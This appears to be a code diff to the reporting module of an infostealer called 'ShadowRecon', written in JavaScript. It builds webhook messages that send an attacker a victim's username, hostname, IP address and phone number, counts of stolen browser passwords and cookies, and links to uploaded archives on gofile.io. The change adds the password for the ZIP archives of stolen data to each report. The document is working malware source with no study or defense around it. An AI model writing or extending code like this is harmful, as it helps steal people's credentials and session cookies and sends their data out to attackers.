@@ -224,9 +224,10 @@ class Statistics {
      * @param {string} hostname - Hostname
      * @param {string} ip - IP address
      * @param {string} link - Optional file link
+     * @param {string} archivePassword - Archive password for ZIP file
      * @returns {string} JSON payload
      */
-    buildWebhookPayload(username, hostname, ip, link = '') {
+    buildWebhookPayload(username, hostname, ip, link = '', archivePassword = '') {
         const stats = this.getFormattedStats();
         const timestamp = new Date().toISOString();
         
@@ -280,6 +281,11 @@ class Statistics {
                         name: ":mobile_phone: Phone:",
                         value: `\`${phone}\``,
                         inline: true
+                    },
+                    {
+                        name: ":lock: Archive Password:",
+                        value: `\`${archivePassword || 'N/A'}\``,
+                        inline: false
                     }
                 ],
                 author: {
@@ -305,7 +311,7 @@ class Statistics {
                     },
                     {
                         name: "Data:",
-                        value: `:key: - **${stats.browsers.passwords}** Passwords Found\n:file_folder: - [ShadowRecon Password](${link || 'https://gofile.io'})`
+                        value: `:key: - **${stats.browsers.passwords}** Passwords Found\n:file_folder: - [ShadowRecon Password](${link || 'https://gofile.io'})\n:lock: - Password: \`${archivePassword || 'N/A'}\``
                     }
                 ],
                 footer: {
@@ -324,7 +330,7 @@ class Statistics {
                     },
                     {
                         name: "Data:",
-                        value: `:key: - **${stats.browsers.cookies}** Cookies Found\n:cookie: - [ShadowRecon Cookies](${link || 'https://gofile.io'})`
+                        value: `:key: - **${stats.browsers.cookies}** Cookies Found\n:cookie: - [ShadowRecon Cookies](${link || 'https://gofile.io'})\n:lock: - Password: \`${archivePassword || 'N/A'}\``
                     }
                 ],
                 footer: {
